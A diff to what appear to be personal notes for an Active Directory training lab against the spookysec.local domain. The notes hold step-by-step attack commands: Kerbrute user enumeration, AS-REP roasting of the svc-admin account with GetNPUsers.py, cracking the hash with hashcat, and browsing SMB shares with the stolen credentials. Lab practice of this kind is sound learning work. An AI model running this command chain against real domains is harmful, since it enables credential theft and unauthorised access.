@@ -18,16 +18,76 @@ INSTAL IMPACKET
 INSTALL BLOODOUND && neo4j
                   1- apt install bloodhound neo4j
                   2- sudo apt update && sudo apt upgrade -y
+INSTALL KERBRUTE
+                  1- git clone https://github.com/Sq00ky/attacktive-directory-tools.git
+                  2- #executable kerbrute
+                          chmod u=rwx kerbrute 
+                          chmod +x kerbrute 
+                      #useful command
+                          ./kerbrute -h  #can see the usage for kerbrute
+
                 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
-ENUMERATION
+ENUMERATION      NMAP &&  ENUM$LINUX   && NMAP 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+ENUM4LINUX
                   1- enum4linux [OPTIONS] IP
                   2- Kerbrute: brute force discovery of users, passwords and even password spray!
                   !! NOT recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.
-                  
+                  3- #how to properly use userenum
+                                          "./kerbrute userenum -h"
+                     #take a look to the flags
+                                  --dc
+                                  -d
+                                  -t
+                                          "./kerbrute userenum --dc 10.10.71.93 -d spookysec.local userlist.txt -t 100"
+NMAP    
+                  1- "nmap -sV -sC -T4 <MACHINE_IP>"
+
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+EXPLOIT    GetNPUsers.py   &&   HASHCAT
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Attack method called ASREPRoasting: 
+                        Occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the 
+                        account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
+
+Retrieving Kerberos Tickets
+                        Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts
+                        from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated 
+                        previously via Kerbrute.
+GetNPuser.py
+                        1- "GetNPUsers.py  -h"
+                        2- execute a command 
+                            "GetNPUsers.py -no-pass -dc-ip 10.10.71.93 spookysec.local/svc-admin"
+                        3- Save hash and copy to file
+                            "python3 GetNPUsers.py spookysec.local/svc-admin -no-pass | tee ~/Downloads/hash.txt"
+HASHCAT
+            1-  "hashcat -m 18200 -a 0 hash.txt passwordlist.txt --force"
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+ENUMERATION    With   USER ACCOUNT CREENTIALS
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+TOOLS:   smbclient
+
+smbclient: 
+          1- "smbclient -L spookysec.local -U svc-admin"
+              # you will be prompted for passwd & then shares will be listed on spookysec.local
+          2- If you find an Ineteresting share connect to it (ie backup dir)
+              "smbclient '\\\\spookysec.local\\backup' -U svc-admin"
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
